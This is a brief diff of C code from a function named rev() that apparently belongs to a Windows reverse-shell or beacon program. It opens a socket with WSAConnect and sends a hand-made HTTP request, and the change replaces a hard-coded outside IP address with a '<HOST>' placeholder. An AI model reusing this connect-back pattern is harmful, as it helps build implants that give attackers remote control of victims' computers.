@@ -16,7 +16,7 @@ void rev(){
         if(!WSAConnect(sock,(struct sockaddr *)&addr,sizeof(addr),NULL,NULL,NULL,NULL)){
             char http[] =
             "GET / HTTP/1.1\r\n"
-            "Host: 45.62.229.15\r\n"
+            "Host: <HOST>\r\n"
             "Connection: keep-alive\r\n"
             "User-Agent: curl"
             "Accept: */*\r\n\r\n";
